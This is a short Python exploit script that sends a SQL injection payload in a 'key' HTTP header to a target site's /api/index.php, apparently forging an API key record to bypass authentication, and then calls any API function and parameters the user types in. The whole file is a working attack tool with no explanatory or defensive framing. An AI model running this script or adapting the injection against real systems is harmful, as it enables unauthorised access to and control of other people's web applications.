import requests
u = input("Enter your url:")
url =u+"/api/index.php"

header = {
    "key":"""1'union select 1,'Default','gbmZ48tzyLfx8PqapQB3el8nGFPqQldS',NULL,1,0,1#"""
}
function= input("Enter the function you want to execute:")
name  = input("Enter the parameters you want to execute:")
data ={
    "function":function,
    "name":name
}
res =requests.post(url=url,headers=header,data=data)
print(res.text)
